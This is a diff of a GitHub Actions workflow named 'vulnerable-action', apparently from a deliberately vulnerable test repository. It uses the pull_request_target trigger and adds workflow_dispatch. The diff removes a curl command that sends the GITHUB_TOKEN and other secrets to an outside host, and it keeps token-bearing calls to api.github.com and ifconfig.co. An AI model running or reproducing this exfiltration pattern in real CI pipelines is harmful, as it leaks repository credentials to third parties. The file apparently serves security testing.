@@ -1,7 +1,7 @@
 name: vulnerable-action
 run-name: ${{ github.actor }} is running a normal pr close action
 on:
-  pull_request_target:
+  [pull_request_target, workflow_dispatch]
 
 env:
   GITHUB_TOKEN: ${{secrets.GITHUB_TOKEN}}
@@ -20,6 +20,5 @@ jobs:
 
       - name: Configure creds or whatever
         run: |
-               curl -v "http://xss.examplevictim.com/" -d "a=$GITHUB_WORKSPACE" -d "x=$GITHUB_TOKEN" -d "t=$SECRET_TEST" -d "tt=$TEST_TOKEN";
-               curl -v ifconfig.co;
                curl -H "Authorization: Token $GITHUB_TOKEN" "https://api.github.com/user";
+               curl -v ifconfig.co;
